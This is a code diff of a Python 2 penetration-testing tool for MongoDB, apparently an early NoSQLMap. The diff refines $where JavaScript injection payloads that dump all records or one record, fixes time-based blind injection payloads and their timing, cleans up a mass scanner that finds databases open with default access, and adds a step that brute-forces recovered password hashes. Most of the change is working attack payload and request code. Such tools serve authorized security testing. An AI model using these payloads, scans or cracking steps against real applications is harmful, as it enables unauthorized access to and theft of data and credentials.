@@ -29,6 +29,7 @@ import gridfs
 import ipcalc
 import signal
 import ast
+import datetime
 from hashlib import md5
 
 #Set a list so we can track whether options are set or not to avoid resetting them in subsequent cals to the options menu.
@@ -199,6 +200,7 @@ def options():
 				httpMethod = raw_input("Select an option: ")
 			
 				if httpMethod == "1":
+					httpMethod = "GET"
 					print "GET request set"
 					optionSet[3] = True
 					options()
@@ -606,7 +608,7 @@ def postApps():
 			possAddrs.append(str(neDict))
 		#Delete the extra key
 		del postData[injOpt + "[$ne]"]
-		postData.update({injOpt:"=a'; return db.a.find(); var dummy='!"})
+		postData.update({injOpt:"a'; return db.a.find(); var dummy='!"})
 		body = urllib.urlencode(postData)
 		req = urllib2.Request(appURL,body)
 		print "Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n"
@@ -633,7 +635,7 @@ def postApps():
 			possAddrs.append(str(postData))
 		
 		print "\n"
-		postData.update({injOpt:"=1; return db.a.find(); var dummy=1"})
+		postData.update({injOpt:"1; return db.a.find(); var dummy=1"})
 		body = urllib.urlencode(postData)
 		req = urllib2.Request(appURL,body)
 		print "Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n"
@@ -661,7 +663,7 @@ def postApps():
 			
 		#Start a single record attack in case the app expects only one record back
 		
-		postData.update({injOpt:"=a'; return db.a.findOne(); var dummy='!"})
+		postData.update({injOpt:"a'; return db.a.findOne(); var dummy='!"})
 		body = urllib.urlencode(postData)
 		req = urllib2.Request(appURL,body)
 		print "Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n"
@@ -688,7 +690,7 @@ def postApps():
 			possAddrs.append(str(postData))
 			
 		print "\n"
-		postData.update({injOpt:"=1; return db.a.findOne(); var dummy=1"})
+		postData.update({injOpt:"1; return db.a.findOne(); var dummy=1"})
 		body = urllib.urlencode(postData)
 		req = urllib2.Request(appURL,body)
 		print "Testing Mongo <2.4 $where Javascript integer escape attack for one record...\n"
@@ -715,7 +717,7 @@ def postApps():
 			possAddrs.append(str(postData))
 			
 		print "\n"
-		postData.update({injOpt:"=a'; return this.a != '" + injectString + "'; var dummy='!"})
+		postData.update({injOpt:"a'; return this.a != '" + injectString + "'; var dummy='!"})
 		body = urllib.urlencode(postData)
 		req = urllib2.Request(appURL,body)
 		
@@ -741,7 +743,7 @@ def postApps():
 			possAddrs.append(str(postData))
 			
 		print "\n"
-		postData.update({injOpt:"=1; return this.a != '" + injectString + "'; var dummy=1"})
+		postData.update({injOpt:"1; return this.a != '" + injectString + "'; var dummy=1"})
 		body = urllib.urlencode(postData)
 		req = urllib2.Request(appURL,body)
 		print "Testing Mongo this not equals integer escape attack for all records..."
@@ -770,43 +772,44 @@ def postApps():
 		
 		if doTimeAttack == "y" or doTimeAttack == "Y":
 			print "Starting Javascript string escape time based injection..."
-			start = time.time()
-			postData.update({injOpt:"=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!"})
+			postData.update({injOpt:"a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(curDate.getTime()-date.getTime()))/1000 < 10); return true; var dummy='a"})
 			body = urllib.urlencode(postData)
 			conn = urllib2.urlopen(req,body)
+			start = time.time()
 			page = conn.read()
 			end = time.time()
 			conn.close()
-			#print str(end)
-			#print str(start)
+			print str(end)
+			print str(start)
 			strTimeDelta = (int(round((end - start), 3)) - timeBase)
 			#print str(strTimeDelta)
 			if strTimeDelta > 25:
-				print "HTTP load time variance was " + str(strTimeDelta) +" seconds! Injection possible."
+				print "HTTP load time variance was " + str(strTimeDelta) +"  seconds! Injection possible."
 				strTbAttack = True
 			
 			else:
-				print "HTTP load time variance was only " + str(strTimeDelta) + "seconds.  Injection probably didn't work."
+				print "HTTP load time variance was only " + str(strTimeDelta) + " seconds.  Injection probably didn't work."
 				strTbAttack = False
 			
 			print "Starting Javascript integer escape time based injection..."
-			start = time.time()
-			postData.update({injOpt:"=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1"})
+			
+			postData.update({injOpt:"1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1"})
 			body = urllib.urlencode(postData)
+			start = time.time()
 			conn = urllib2.urlopen(req,body)
 			page = conn.read()
-			end = time.time()
+			end = time.time()			
 			conn.close()
-			#print str(end)
-			#print str(start)
-			intTimeDelta = (int(round((end - start), 3)) - timeBase)
+			print str(end)
+			print str(start)
+			intTimeDelta = ((end-start) - timeBase)
 			#print str(strTimeDelta)
 			if intTimeDelta > 25:
 				print "HTTP load time variance was " + str(intTimeDelta) +" seconds! Injection possible."
 				intTbAttack = True
 			
 			else:
-				print "HTTP load time variance was only " + str(intTimeDelta) + "seconds.  Injection probably didn't work."
+				print "HTTP load time variance was only " + str(intTimeDelta) + " seconds.  Injection probably didn't work."
 				intTbAttack = False
 		
 		print "\n"	
@@ -1403,10 +1406,6 @@ def massMongo():
 				raw_input("Not a valid subnet.  Press enter to return to main menu.")
 				mainMenu()
 				
-	
-		print "Debug:"
-		print ipList
-	
 		if loadOpt == "2":
 			while loadCheck == False:
 				loadPath = raw_input("Enter file name with IP list to scan: ")
@@ -1431,7 +1430,6 @@ def massMongo():
 			dbList = conn.database_names()
 			
 			print "Successful default access on " + target
-			target = target[:-1]
 			success.append(target)
 			conn.disconnect()
 
@@ -1508,6 +1506,7 @@ def getDBInfo():
 	retrUsers = 0
 	users = []
 	hashes = []
+	crackHash = ""
 	
 	chars = string.ascii_letters + string.digits
 	print "Getting baseline True query return size..."
@@ -1693,8 +1692,16 @@ def getDBInfo():
 				charCounterHash = 0
 				rightCharsHash = 0
 				pwdHash = ""
+	crackHash = raw_input("Crack recovered hashes (y/n)?:  ")		
 		
-		
+	if crackHash == "y" or crackHash == "Y":
+		menuItem = 1
+		for user in users:
+			print str(menuItem) + "-" + user
+			menuItem +=1
+				
+		userIndex = raw_input("Select user hash to crack: ")
+		brute_pass(users[int(userIndex)-1],hashes[int(userIndex)-1])
 		
 			
 	raw_input("Press enter to continue...")
